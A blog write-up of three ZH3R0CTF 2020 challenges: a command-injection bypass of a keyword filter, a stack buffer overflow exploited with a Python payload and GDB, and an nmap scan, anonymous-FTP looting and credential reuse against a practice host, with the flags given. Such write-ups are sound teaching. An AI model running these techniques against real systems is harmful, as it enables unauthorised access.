---
title: "ZH3R0CTF 2020"
date: 2020-06-18T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["ctf", "writeup", "compete", "zh3r0ctf"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "A writeup of some challeges for ZH3R0CTF 2020"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
cover:
    image: "zh3r0ctf_logo.png" # image path/url
    alt: "Zero CTF Logo" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---


> **Dates:** June 15th - June 17th 2020
>
> **Team Members:**
> - itsecgary
> - birch

https://ctftime.org/event/1062


---


## Command-1
**Category:** Binary Exploitation

**Points:** 227

**Description:**
> **Given:** command_1

### Writeup
To start, I went ahead and ran the function to see what we are dealing with.
```
$ ./command_1
Please enter your name: itsecgary
Hello itsecgary

-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
```

Looks like we have a menu with some options. After looking through some of the
options and playing with the options in the menu, I opened it up in **Ghidra**
to do a closer analysis of what is happening. Here are some functions we see:

**main**
```
void main(EVP_PKEY_CTX *param_1) {
  int iVar1;

  init(param_1);
  printf("Please enter your name: ");
  read(0,name,0x10);
  printf("Hello %s\n",name);
  do {
    while( true ) {
      while( true ) {
        menu();
        iVar1 = number();
        if (iVar1 != 2) break;
        runcommand();
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        addcommand();
      }
      else {
LAB_00400ec5:
        puts("I don\'t see where you are going.");
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_00400ec5;
    }
    editcommand();
  } while( true );
}
```

**addcommand**
```
void addcommand(void) {
  char *pcVar1;
  char *__dest;
  long in_FS_OFFSET;
  char *local_30;
  char local_1a [10];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the command you want to add.");
  printf("> ");
  read(0,local_1a,10);
  pcVar1 = strstr(local_1a,"flag");
  if ((((pcVar1 != (char *)0x0) || (pcVar1 = strstr(local_1a,"/bin"), pcVar1 != (char *)0x0)) ||
      (pcVar1 = strstr(local_1a,"sh"), pcVar1 != (char *)0x0)) ||
     (((pcVar1 = strstr(local_1a,"echo"), pcVar1 != (char *)0x0 ||
       (pcVar1 = strstr(local_1a,"cat"), pcVar1 != (char *)0x0)) ||
      ((pcVar1 = strstr(local_1a,"shutdown"), pcVar1 != (char *)0x0 ||
       (pcVar1 = strstr(local_1a,"init 0"), pcVar1 != (char *)0x0)))))) {
    puts("I don\'t see where you are going you idiot");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  if ((int)ind < 3) {
    __dest = (char *)malloc(0x18);
    *(undefined8 *)(__dest + 0x10) = 0;
    strncpy(__dest,local_1a,4);
    pcVar1 = __dest;
    if (head != (char *)0x0) {
      local_30 = head;
      while (*(long *)(local_30 + 0x10) != 0) {
        local_30 = *(char **)(local_30 + 0x10);
      }
      *(char **)(local_30 + 0x10) = __dest;
      pcVar1 = head;
    }
    head = pcVar1;
    printf("Command added at index [%d]\n.",(ulong)ind);
    *(char **)(magic + (long)(int)ind * 8) = __dest;
    ind = ind + 1;
  }
  else {
    printf("No more space you idiot\n.");
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

**editcommand**
```
void editcommand(void) {
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_48;
  char *local_40;
  char local_38 [40];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0;
  puts("Enter index you want to edit: ");
  iVar1 = number();
  if (((iVar1 < 0) || (2 < iVar1)) || (*(long *)(magic + (long)iVar1 * 8) == 0)) {
    puts("Oops don\'t hack me please.");
  }
  else {
    local_40 = head;
    while (local_48 != iVar1) {
      local_40 = *(char **)(local_40 + 0x10);
      local_48 = local_48 + 1;
    }
    printf("Enter new command -> ");
    sVar2 = read(0,local_38,0x18);
    if (sVar2 < 0) {
      puts("You must be unlucky.");
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    strcpy(local_40,local_38);
    puts("Command edited.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

**runcommand**
```
void runcommand(void) {
  int iVar1;
  int local_18;
  char *local_10;

  local_18 = 0;
  puts("So you want to run the command:");
  printf("Enter the index of the command: ");
  iVar1 = number();
  if (((iVar1 < 0) || (2 < iVar1)) || (*(long *)(magic + (long)iVar1 * 8) == 0)) {
    puts("What do you want to run you idiot.");
  }
  else {
    local_10 = head;
    while (local_18 != iVar1) {
      local_10 = *(char **)(local_10 + 0x10);
      local_18 = local_18 + 1;
    }
    system(local_10);
  }
  return;
}
```

My apologies for all of the code dumping here, but it is important to see that
the **addcommand()** function checks the input and filters out specific commands that
would be useful to show the flag. The **runcommand()** function simply just runs
the function. The **editcommand()** function edits the command *WITHOUT* sanitizing.

This allows us to add a command, edit that command to whatever we want (probably
  'cat flag.txt') and run that command.

```
$ nc us.pwn.zh3r0.ml 8520
Please enter your name: itsecgary
Hello itsecgary

-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 1
Enter the command you want to add.
> poopoo
Command added at index [0]
.-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 3
Enter index you want to edit:
0
Enter new command -> cat flag.txt
Command edited.
-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 2
So you want to run the command:
Enter the index of the command: 0
zh3r0{the_intended_sol_useoverflow_change_nextpointer_toFakechunk_in_bssname}
```

### Flag
zh3r0{the_intended_sol_useoverflow_change_nextpointer_toFakechunk_in_bssname}

### Resources
Ghidra - https://ghidra-sre.org/


---


## Free Flag
**Category:** Binary Exploitation

**Points:** 124

**Description:**
> Welcome to zh3r0 ctf
> Here's your free flag
>
> pwn.zh3r0.ml 3456
>
> **Author:** hk
>
> **Given:** file: chall

### Writeup
To start off, let's run the program and see if we can work with some input:
```
nc pwn.zh3r0.ml 3456
Welcome to zh3r0 ctf.
Please provide us your name:
itsecgary

```

Looks like we have to enter a *"name"* and it will give us the flag somehow.
The next step here is to take a closer look at the binary file given to us. I will
use **Ghidra** (tool from the NSA) to decompile the program.

Opening up our function list, we see some potential functions to take a peek at:
- main
- here
- winwin

Let's see what they have:
**main:**
```
undefined8 main(EVP_PKEY_CTX *param_1) {
  init(param_1);
  here();
  return 0;
}
```

**here**
```
void here(void) {
  ssize_t sVar1;
  undefined local_28 [32];

  puts("Welcome to zh3r0 ctf.");
  puts("Please provide us your name: ");
  sVar1 = read(0,local_28,0x38);
  if (sVar1 == 0) {
    puts("Unlucky:-------- ): ");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  return;
}
```

**winwin**
```
void win_win(void) {
  system("cat flag.txt");
  return;
}
```

Looking at these functions we see that main() calls here() so our function here
really starts in here(). In here() we see that it takes in an input of 0x38 size,
which is a maximum of 54 characters accepted. After that, it doesn't really do
much besides exit the program. Hmmmm...

Our winwin() function looks like it gives us the flag, which sets out goal to be
able to run the code in that function. This is where we can use a **buffer
overflow**. Now, if you don't know what that is, watch the videos
linked down below to get a little understanding of what it is and how it works.

At this point, I used **GDB** to help me look at the stack during execution. For
the input, I will use a string of characters to help me determine the length I
need to set my payload and where I will need to inject the address to the winwin()
function.

**alphabet**
```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

To start, I am going to set a breakpoint at the return value of main (practically
the end of the program). After this, I will define a hook to display the current
instruction that will be executed and examine 16 words from the stack.
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004007d9 <+0>:     push   %rbp
   0x00000000004007da <+1>:     mov    %rsp,%rbp
   0x00000000004007dd <+4>:     mov    $0x0,%eax
   0x00000000004007e2 <+9>:     callq  0x40076e <init>
   0x00000000004007e7 <+14>:    mov    $0x0,%eax
   0x00000000004007ec <+19>:    callq  0x40071a <here>
   0x00000000004007f1 <+24>:    mov    $0x0,%eax
   0x00000000004007f6 <+29>:    pop    %rbp
   0x00000000004007f7 <+30>:    retq
End of assembler dump.

(gdb) break *0x00000000004007f7
Breakpoint 1 at 0x4007f7

(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $rip
>x/8wx $rsp
>end
```  

Now I will run through the program with what we came up with above.
```
(gdb) r
Starting program: /home/gary/ctfs/zh3r0_CTF2020/binary_exploitation/free_flag/chall
Welcome to zh3r0 ctf.
Please provide us your name:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
=> 0x40076d <here+83>:  retq
0x7ffffffee128: 0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e
0x7ffffffee138: 0xff5c70b3      0x00007fff      0xff7dd620      0x00007fff
0x000000000040076d in here ()
(gdb) OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Undefined command: "OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ".  Try "help".
```

Hmm okay interesting. Looks like it only accepted up to our N's *(0x4e)*.
But the interesting thing here is that we can set the new return address to be
whatever we want where the K's *(0x4b)* are.

Let's change our input here a little bit. Next thing to do is grab the address
of the win_win() funciton where it begins.
```
(gdb) disassemble win_win
Dump of assembler code for function win_win:
   0x0000000000400707 <+0>:     push   %rbp
   0x0000000000400708 <+1>:     mov    %rsp,%rbp
   0x000000000040070b <+4>:     lea    0x172(%rip),%rdi        # 0x400884
   0x0000000000400712 <+11>:    callq  0x4005d0 <system@plt>
   0x0000000000400717 <+16>:    nop
   0x0000000000400718 <+17>:    pop    %rbp
   0x0000000000400719 <+18>:    retq
End of assembler dump.
```

I wrote a few lines of code to let us encode the function address into chars.
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"
eip = struct.pack("I", 0x0040070b)
payload = struct.pack("I", 0x00000000)
print(padding+eip+payload)
```

**alphabet**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
```

Let's give this a shot.
```
$ ./chall < alphabet
Welcome to zh3r0 ctf.
Please provide us your name:
cat: flag.txt: No such file or directory
```

NICE! Looks like it reaches the part of the code where it returns the flag.
Let's connect to the service and get this flag.
```
$ nc pwn.zh3r0.ml 3456 < alphabet
Welcome to zh3r0 ctf.
Please provide us your name:
zh3r0{welcome_to_zh3r0_ctf}
```

### Flag
zh3r0{welcome_to_zh3r0_ctf}

### Resources
Ghidra - https://ghidra-sre.org/

Videos
- https://www.youtube.com/watch?v=akCce7vSSfw
- https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- https://www.youtube.com/watch?v=1S0aBV-Waeo

These videos really helped me understand how buffer overflows occur and how to
exploit them :)


---


## HTB
**Category:** Hack The Box

**Number of flags:** 8 total

**Description:**
> Description: Here's the url ;)
>
>   hackit.zh3r0.ml
>
> **Author :** Mr.Holmes


### Writeup
This was a pretty unique challenge set for a CTF competition. Despite the fact
most players get a lot of practice from the HackTheBox website and their
challenges, we don't see too many of them for a CTF.

For those who know, **Nmap** is practically the first tool that comes to mind when
*only* given a host. You can find links in the *Resources* section below. Kali
has this loaded already, but for linux, it's a quick install. I also realized that it
isn't possible on Windows Subsystem for Linux :( #rip

I personally used Zenmap for Windows because it is what I had at the time. here
is the command I ran:
```
nmap -sC -sV -p- hackit.zh3r0.ml
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 09:25 Eastern Daylight Time
Nmap scan report for 139.59.3.42
Host is up (0.27s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE  VERSION
22/tcp    open     http     PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)

99/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 70:78:8f:70:79:59:72:5f:05:c9:2a:63:b4:34:c1:52 (RSA)
|   256 08:6d:42:16:2a:47:ae:b4:d7:fa:35:28:91:67:ab:63 (ECDSA)
|_  256 e4:89:6b:09:37:64:c2:47:01:bd:c2:32:d8:cd:06:2d (ED25519)

324/tcp   open     ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:173.120.119.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

4994/tcp  open     unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|     Heyo, Watcha looking at? Employee ID yoo! :
|     away kiddo, huh, Kids these days!
|   NULL:
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|_    Heyo, Watcha looking at? Employee ID yoo! :

11211/tcp filtered memcache
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4994-TCP:V=7.80%I=7%D=6/18%Time=5EEB6FE7%P=i686-pc-windows-windows%
SF:r(NULL,18C,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\|\|Employee\x20Entry\|\|\n\n--------------------------
SF:--------------------------------\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherlock\x20Holmes\x20In
SF:c\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's
SF:\x20a\x20free\x20flag\x20for\x20you,\x20just\x20for\x20finding\x20this\
SF:x20door!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x2
SF:0looking\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\n")%r(GenericLines,
SF:1B1,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:0\x20\x20\|\|Employee\x20Entry\|\|\n\n---------------------------------
SF:-------------------------\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherlock\x20Holmes\x20Inc\.\n~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's\x20a\x
SF:20free\x20flag\x20for\x20you,\x20just\x20for\x20finding\x20this\x20door
SF:!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x20lookin
SF:g\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\nGo\x20away\x20kiddo,\x20h
SF:uh,\x20Kids\x20these\x20days!\n")%r(GetRequest,1B1,"\n~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\|Employee\x2
SF:0Entry\|\|\n\n---------------------------------------------------------
SF:-\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Sherlock\x20Holmes\x20Inc\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's\x20a\x20free\x20flag\x20for\x2
SF:0you,\x20just\x20for\x20finding\x20this\x20door!\x20Flag\x201:\x20zh3r0
SF:{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x20looking\x20at\?\x20Employee\x2
SF:0ID\x20yoo!\x20:\x20\nGo\x20away\x20kiddo,\x20huh,\x20Kids\x20these\x20
SF:days!\n")%r(HTTPOptions,1B1,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\|\|Employee\x20Entry\|\|\n\n---------
SF:-------------------------------------------------\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherloc
SF:k\x20Holmes\x20Inc\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~\nHere's\x20a\x20free\x20flag\x20for\x20you,\x20just\x20for\x2
SF:0finding\x20this\x20door!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nH
SF:eyo,\x20Watcha\x20looking\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\nG
SF:o\x20away\x20kiddo,\x20huh,\x20Kids\x20these\x20days!\n");
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1391.93 seconds
```

We see a lot of information here. Where to start!

Let's start with port **22**. The information given to us in the output suggests that
there is a website standing on this port, which is odd considering **22** is
reserved for SSH.

I went ahead and ran a curl on the website on port 22:
```
$ curl hackit.zh3r0.ml:22
z3hr0{shouldve_added_some_filter_here}
```

Sweet. First flag!

Let's now take a look at port **324**. The information from our output shows us
that FTP is running at this port. This is not usual as well because FTP's default
and reserved protocol is *21*. We also notice that "Anonymous login" is enabled
for FTP, which means we can login as **anonymous** with an empty password and
poke around.
```
$ ftp hackit.zh3r0.ml 324
Connected to hackit.zh3r0.ml.
220 (vsFTPd 3.0.3)
Name (hackit.zh3r0.ml:itsecgary): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> _
```

Now we are logged in. Typing *help* is a good way to see what commands we can run.
```
ftp> help
Commands may be abbreviated.  Commands are:

!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         runique
debug           macdef          proxy           send
ftp> _
```

Nice. Let's try some:
```
ftp> dir
500 Illegal PORT command.
425 Use PORT or PASV first.
ftp> ls
500 Illegal PORT command.
ftp> _
```

Looks like an illegal command. After doing some research, I learned that being in
passive passes these commands through.
```
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,143,73).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ...
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,159,1).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 18 09:06 ...
-rw-r--r--    1 ftp      ftp            46 Jun 18 09:06 .stayhidden
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,233,178).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
-rw-r--r--    1 ftp      ftp            34 Jun 18 09:06 .flag
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp>
```

Looks like we have a couple files!! **..** is for the directory before and **.**
is for the current directory. They tried to be sneaky with the **...** directory.
We can retrieve these files using ` get <file> <new_file_name> `, which tranfers
these files to our machine (hence File Transfer Protocol). I grabbed each of the
*test.txt* files and renamed them as test1, test2, and test3 in case they were
different content-wise.

Let's see what we are working with:
```
$ ls -la
total 0
drwxrwxrwx 1 gary gary 512 Jun 18 09:09 .
drwxrwxrwx 1 gary gary 512 Jun 18 09:09 ..
-rw-rw-rw- 1 gary gary  34 Jun 18 09:05 .flag
-rw-rw-rw- 1 gary gary  46 Jun 18 09:08 .stayhidden
-rw-rw-rw- 1 gary gary  22 Jun 18 09:06 test1
-rw-rw-rw- 1 gary gary  22 Jun 18 09:07 test2
-rw-rw-rw- 1 gary gary  22 Jun 18 09:09 test3

$ cat .flag
Flag 2: zh3r0{You_know_your_shit}

$ cat .stayhidden
Employee ID: 6890d90d349e3757013b02e495b1a87f

$ cat test1
LOL Nothing here. ;-;

$ cat test2
LOL Nothing here. ;-;

$ cat test3
LOL Nothing here. ;-;
```

Welp we got another flag. *Note:* While writing this writeup, I didn't realize
there was another **...** directory in the first **...** directory so I only
extracted the first two *test.txt* files and the *.stayhidden* file so #rip me
for missing out on 419 points lol. We also retrieved an *Employee ID* which may
be useful later!

Let's take a look at the open port on **4994**

```
$ nc hackit.zh3r0.ml 4994

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     ||Employee Entry||

----------------------------------------------------------
                     Sherlock Holmes Inc.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
Heyo, Watcha looking at? Employee ID yoo! :
6890d90d349e3757013b02e495b1a87f
Hey I know you! You work here!
Books are a uniquely portable magic. - Stephen King

Flag 4: zh3r0{y0ur_s4l4ry_wa5_cr3dit3d}
```

Looks like they gave us a flag right away. We also got a prompt for the Employee
ID, which is what we found above. After entering it in, we get Flag 4!

This is all I found for these challenges. Flags **3**, **6**, **7**, and **8**
were all somewhere on the host. https://github.com/sidchn/zh3r0CTF-writeup is
another writeup that kind of hits on Flags **3** and **6**.


### Flags
**Flag 1:** zh3r0{pr05_d0_full_sc4n5}

**Flag 2:** zh3r0{You_know_your_shit}

**Flag 4:** zh3r0{y0ur_s4l4ry_wa5_cr3dit3d}

**Flag 5:** z3hr0{shouldve_added_some_filter_here}

### Resources
Nmap/Zenmap - https://nmap.org/download.html


---




